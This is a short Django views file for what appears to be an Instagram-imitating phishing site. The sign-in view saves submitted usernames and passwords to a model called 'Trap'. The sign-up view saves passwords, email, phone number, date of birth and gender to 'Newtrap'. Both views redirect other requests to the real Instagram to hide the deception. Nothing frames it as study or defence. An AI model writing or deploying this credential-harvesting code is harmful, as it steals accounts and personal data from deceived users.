import email
from django.http import request
from django.shortcuts import redirect, render
from lock.models import Trap, Newtrap

# Create your views here.
def index(request):
    return render(request, "index.html")

def signedin(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")
        trap = Trap(username=username , password=password )
        trap.save()
        return render(request, "enter.html")
    return redirect("https://www.instagram.com/")
def login(request):
    return render(request,"signin.html",)
def signup(request):
    return render(request,"signup.html",)
def signedup(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")
        dateofbirth = request.POST.get("dateofbirth")
        number = request.POST.get("number")
        email = request.POST.get("email")
        gender = request.POST.get("gender")
        newtrap = Newtrap(username=username , password=password, email=email, dob= dateofbirth, gender = gender, number =number)
        newtrap.save()
        return render(request, "enter.html")
    return redirect("https://www.instagram.com/")